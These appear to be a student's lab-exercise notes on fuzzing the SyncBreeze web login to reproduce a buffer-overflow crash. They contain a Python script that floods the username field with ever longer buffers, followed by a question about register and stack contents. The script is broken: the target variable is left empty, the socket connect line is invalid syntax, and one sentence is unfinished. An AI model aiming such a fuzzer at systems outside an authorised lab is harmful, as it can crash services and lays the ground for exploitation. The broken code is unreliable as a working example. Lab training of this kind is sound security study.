# 11.1.2 Discovering the Vulnerability
## Practice - Discovering the Vulnerability

_(To be performed on your own Kali and Windows lab client machines - Reporting is required for these exercises)_

1.  Build the fuzzer and replicate the SyncBreeze crash.
To start we must first build a fuzzer using python. We can use the following code to gather :
```python
#!/usr/bin/python
import socket
import time
import sys

size = 100
target = 

while(size < 2000):
  try:
    print("\nSending buffer with %s bytes" % size)
    
    inputBuffer = "A" * size
    
    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 10.11.0.22\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://10.11.0.22/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    
    buffer += content

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    
    s.connect((%s, 80) % (target))
    s.send(buffer)
    
    s.close()

    size += 100
    time.sleep(10)
    
  except:
    print("\nCould not connect!")
    sys.exit()
```


2.  Inspect the content of other registers and stack memory. Does anything seem to be directly influenced by the fuzzing input?